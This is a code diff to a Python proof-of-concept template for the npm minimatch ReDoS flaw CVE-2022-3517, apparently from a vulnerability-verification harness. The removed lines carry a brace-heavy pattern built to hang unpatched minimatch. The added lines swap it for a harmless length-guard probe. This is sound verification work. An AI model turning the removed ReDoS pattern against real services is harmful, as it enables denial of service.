@@ -1,4 +1,4 @@
-"""Exploit template: npm minimatch CVE-2022-3517 (GHSA-f8q6-p94x-37v3) — ReDoS.
+"""Exploit template: npm minimatch CVE-2022-3517 (GHSA-f8q6-p94x-37v3) — guard-presence probe.
 
 Advisory facts (confirmed against osv.dev/GHSA at task-3 implementation time):
   CVE: CVE-2022-3517
@@ -6,18 +6,25 @@ Advisory facts (confirmed against osv.dev/GHSA at task-3 implementation time):
   Package: npm minimatch
   Affected: < 3.0.5
   Fixed: 3.0.5
-  Root cause: catastrophic backtracking in braceExpand() when given a brace-heavy
-  pattern that exercises exponential regex alternation.
+  Root cause: catastrophic backtracking in braceExpand(); fixed by introducing
+  MAX_PATTERN_LENGTH = 1024*64 (65536) and assertValidPattern(pattern) in 3.0.5
+  (commit a8763f4), which throws TypeError('pattern is too long') for patterns
+  exceeding the length cap.
 
 Design decisions:
   - SENTINEL_CONFIRMED is the single source of truth for the success output.
   - expected_trigger_sha256 is derived from SENTINEL_CONFIRMED offline with hashlib —
     computed once here, never recomputed at runtime.
-  - No timing or variable data ever enters trigger.js stdout — only one of the two
-    constant sentinels. This keeps the sha256 stable across runs and machines.
-  - THRESHOLD_MS is a conservative default. The exact value + brace pattern are
-    empirically confirmed by the Task 8 live test (docker-gated). This task pins
-    a reasonable default that is intentionally generous on modern hardware.
+  - Only two constant sentinels ever reach trigger.js stdout; the TypeError message
+    goes to stderr. This keeps expected_trigger_sha256 stable across runs and machines.
+  - Mechanism: feed a >64KB pattern (70000 chars). minimatch 3.0.5 throws via
+    assertValidPattern (length guard) → PATCHED → refuted. minimatch 3.0.4 has no
+    length guard → reaches braceExpand/match silently → VULN_CONFIRMED → verified.
+  - This is the deterministic v1 signal: confirms the resolved version lacks the 3.0.5
+    DoS-mitigation guard. True ReDoS detonation (timing-based) is deferred; this
+    guard-presence probe is sufficient to split affected/fixed reliably.
+  - Empirical validation (3.0.4 → VULN_CONFIRMED, 3.0.5 → PATCHED) pending a
+    docker-capable run.
 """
 from __future__ import annotations
 
@@ -29,71 +36,49 @@ from verify.strategy import PocPlan, SeedIncomplete
 # Constants — single source of truth for sentinel strings and the hash
 # ---------------------------------------------------------------------------
 
-#: Emitted to stdout (+ newline) when ReDoS backtracking is observed.
-SENTINEL_CONFIRMED: str = "REDOS_CONFIRMED"
+#: Emitted to stdout (+ newline) when the version lacks the 3.0.5 length guard
+#: → affected/unpatched → verdict verified.
+SENTINEL_CONFIRMED: str = "VULN_CONFIRMED"
 
-#: Emitted to stdout (+ newline) when no backtracking is observed (fast path or throw).
-SENTINEL_NOT_OBSERVED: str = "REDOS_NOT_OBSERVED"
+#: Emitted to stdout (+ newline) when the length guard is present (patched).
+SENTINEL_PATCHED: str = "PATCHED"
 
 # Computed offline from SENTINEL_CONFIRMED + "\n" — never recomputed at runtime.
-# This is what PocPlan.expected_trigger_sha256 is set to; the Task 8 live test
-# confirms that trigger.js actually emits this string on minimatch@3.0.4.
+# trigger.js writes the SAME constant to stdout on minimatch@3.0.4.
 _EXPECTED_SHA256: str = hashlib.sha256(
     (SENTINEL_CONFIRMED + "\n").encode()
 ).hexdigest()
 
-#: Milliseconds before which we declare ReDoS triggered.
-#: Conservative default — Task 8 empirical confirmation required.
-THRESHOLD_MS: int = 2000
-
 # ---------------------------------------------------------------------------
 # trigger.js template
 # ---------------------------------------------------------------------------
-# NOTE on the brace pattern:
-#   A sequence of nested braces like "{a,b,c,...}{a,b,c,...}..." causes minimatch's
-#   braceExpand() to explore an exponential number of combinations via recursive
-#   regex alternation. The pattern below (32 repetitions of {a,b}) is sufficient to
-#   stall minimatch@3.0.4 for several seconds on modern hardware.
-#   THRESHOLD_MS and the exact pattern are empirically confirmed in Task 8.
 
 _TRIGGER_JS_TEMPLATE: str = """\
-// trigger.js — minimatch CVE-2022-3517 ReDoS probe
-// Verifies that minimatch@<3.0.5 hangs on a brace-pathological pattern.
-// Only one of two constant sentinels is ever written to stdout; no variable
-// data (timings, errors) is emitted — this keeps expected_trigger_sha256 stable.
+// trigger.js — minimatch CVE-2022-3517 guard-presence probe
+// Feeds a >64KB pattern to minimatch.  The 3.0.5 fix introduced
+// MAX_PATTERN_LENGTH = 1024*64 (65536) and assertValidPattern(pattern) that
+// throws TypeError('pattern is too long') for patterns exceeding the cap.
 //
-// THRESHOLD_MS and the exact pattern await Task 8 empirical confirmation.
-// This default is intentionally generous for the offline build_plan phase.
+// minimatch 3.0.4 — no length guard → reaches match silently → VULN_CONFIRMED (exit 0)
+// minimatch 3.0.5 — length guard present → throws → PATCHED (exit 1)
+//
+// Only the two constant sentinels reach stdout; the exception message goes to stderr.
 
 "use strict";
 const minimatch = require("minimatch");
-
-const SENTINEL_CONFIRMED = "{sentinel_confirmed}";
-const SENTINEL_NOT_OBSERVED = "{sentinel_not_observed}";
-const THRESHOLD_MS = {threshold_ms};
-
-// Brace-pathological pattern: exponential alternation in braceExpand().
-// Confirmed affected: minimatch < 3.0.5.  Fixed: minimatch 3.0.5 (guards added).
-const PATTERN = "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
-                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
-                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}" +
-                "{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}{{a,b}}";
-
-const deadline = Date.now() + THRESHOLD_MS;
+const OVERLONG = "a".repeat(70000); // > MAX_PATTERN_LENGTH (65536) introduced by the 3.0.5 fix
 let threw = false;
-
 try {{
-  minimatch("a", PATTERN);
+  minimatch("probe-target", OVERLONG);
 }} catch (e) {{
   threw = true;
-  process.stderr.write("minimatch threw: " + e.message + "\\n");
+  process.stderr.write("length guard present (patched): " + e.message + "\\n");
 }}
-
-if (!threw && Date.now() > deadline) {{
-  process.stdout.write(SENTINEL_CONFIRMED + "\\n");
+if (!threw) {{
+  process.stdout.write("{sentinel_confirmed}\\n");  // no length guard -> affected/unpatched -> verified
   process.exit(0);
 }} else {{
-  process.stdout.write(SENTINEL_NOT_OBSERVED + "\\n");
+  process.stdout.write("{sentinel_patched}\\n");    // guard present -> fixed -> refuted
   process.exit(1);
 }}
 """
@@ -103,14 +88,14 @@ if (!threw && Date.now() > deadline) {{
 # ---------------------------------------------------------------------------
 
 def build(hypothesis: dict) -> PocPlan:
-    """Build a PocPlan for CVE-2022-3517 (minimatch ReDoS).
+    """Build a PocPlan for CVE-2022-3517 (minimatch guard-presence probe).
 
     Reads the resolved version from hypothesis["target"]["version_or_revision"].
     Raises SeedIncomplete if the version is missing or blank.
 
     The installed version determines the verdict at harness runtime:
-      - minimatch@3.0.4 → ReDoS triggers → VERDICT_VERIFIED
-      - minimatch@3.0.5 → no ReDoS → VERDICT_REFUTED
+      - minimatch@3.0.4 → no length guard → VULN_CONFIRMED → VERDICT_VERIFIED
+      - minimatch@3.0.5 → length guard present → PATCHED → VERDICT_REFUTED
 
     Args:
         hypothesis: A hypothesis dict as produced by Stage 4b.
@@ -127,8 +112,7 @@ def build(hypothesis: dict) -> PocPlan:
 
     trigger_js = _TRIGGER_JS_TEMPLATE.format(
         sentinel_confirmed=SENTINEL_CONFIRMED,
-        sentinel_not_observed=SENTINEL_NOT_OBSERVED,
-        threshold_ms=THRESHOLD_MS,
+        sentinel_patched=SENTINEL_PATCHED,
     )
 
     return PocPlan(
@@ -138,6 +122,9 @@ def build(hypothesis: dict) -> PocPlan:
         trigger_cmd=["node", "trigger.js"],
         expected_trigger_exit=0,
         expected_trigger_sha256=_EXPECTED_SHA256,
-        files={"trigger.js": trigger_js},
+        files={
+            "trigger.js": trigger_js,
+            "package.json": '{\n  "name": "poc",\n  "version": "1.0.0",\n  "private": true\n}\n',
+        },
         template_id="npm:minimatch:CVE-2022-3517",
     )
